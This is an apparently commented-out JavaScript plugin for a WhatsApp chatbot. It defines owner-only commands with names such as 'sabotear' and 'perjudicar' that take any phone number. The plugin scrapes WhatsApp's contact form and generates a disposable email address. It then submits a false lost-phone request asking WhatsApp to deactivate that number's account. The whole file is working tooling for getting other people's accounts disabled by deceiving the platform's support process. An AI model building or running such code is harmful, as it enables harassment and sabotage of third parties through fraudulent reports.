/*import cheerio from 'cheerio';
import axios from 'axios';
import util from 'util';

let handler = async (m, { conn, isOwner, usedPrefix, command, args }) => {
    console.log(`Ejecutando comando: ${command}, Args:`, args);


if (global.ownersDisabled) {
  return conn.reply(m.chat, "❌ Los comandos de owner están deshabilitados temporalmente.", m);
}

    if (!args || args.length === 0 || !args[0]) {
        console.log("❌ Error: No se ingresó un número válido.");
        return m.reply('[⁉️] Ingrese el número en formato internacional. Ejemplo: +1 (890) 555-555');
    }

    const q = args.join(" ");
    console.log("📞 Número ingresado:", q);
    m.reply("🔄 Procesando solicitud...");

    try {
        console.log("🔄 Obteniendo datos del formulario de WhatsApp...");
        let ntah = await axios.get("https://www.whatsapp.com/contact/noclient/", {
            headers: {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Accept-Language": "en-US,en;q=0.9",
                "Referer": "https://www.whatsapp.com/",
                "Origin": "https://www.whatsapp.com"
            }
        });

        console.log("✅ Respuesta obtenida.");

        console.log("🔄 Generando correo temporal...");
        let email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1");
        let emailAddress = email.data[0];
        console.log("✅ Correo generado:", emailAddress);

        let cookie = ntah.headers["set-cookie"]?.join("; ") || "";
        console.log("🍪 Cookies obtenidas:", cookie);

        let $ = cheerio.load(ntah.data);
        let $form = $("form");
        if (!$form.length) throw '❌ No se encontró el formulario de WhatsApp';

        let url = new URL($form.attr("action"), "https://www.whatsapp.com").href;
        
        let form = {
            "jazoest": $form.find("input[name=jazoest]").val() || "",
            "lsd": $form.find("input[name=lsd]").val() || "",
            "step": "submit",
            "country_selector": "ID",
            "phone_number": q,
            "email": emailAddress,
            "email_confirm": emailAddress,
            "platform": "ANDROID",
            "how_use": "ANDROID",
            "your_message": `Hola, perdí mi teléfono y quiero desactivar mi cuenta temporalmente. Mi número es ${q}. ¿Podrían ayudarme?`
        };

        console.log("📤 Enviando formulario...");
        let res = await axios({
            url,
            method: "POST",
            data: JSON.stringify(form),
            headers: {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Accept-Language": "en-US,en;q=0.9",
                "Referer": "https://www.whatsapp.com/",
                "Origin": "https://www.whatsapp.com",
                "Cookie": cookie,
                "Content-Type": "application/json"
            }
        });

        console.log("📜 Código de estado:", res.status);
        console.log("📩 Respuesta de WhatsApp:", res.data);

        let payload = String(res.data).replace("for (;;);", "");
        let jsonResponse;
        try {
            jsonResponse = JSON.parse(payload);
        } catch (e) {
            console.error("❌ Error al procesar la respuesta JSON:", e);
            throw 'Error procesando la respuesta del servidor';
        }

        if (jsonResponse.payload === true) {
            m.reply(`✅ **Solicitud enviada correctamente.** WhatsApp revisará la solicitud y responderá por correo.`);
        } else if (jsonResponse.payload === false) {
            m.reply(`❗ **WhatsApp necesita más información.** Envía una captura de tu contrato o factura telefónica.`);
        } else {
            m.reply(util.format(jsonResponse));
        }

    } catch (error) {
        console.error("❌ Error en la solicitud:", error.response ? error.response.data : error.message);
        m.reply(`⚠️ **Ocurrió un error inesperado:**\n${error.response ? error.response.data : error.message}`);
    }
};

handler.tags = ['owner'];
handler.command = /^(whatsappsp|orden|sabotear|perjudicar|desactivar|manipular|protocolo|alterar)$/i;
handler.rowner = true;
export default handler;*/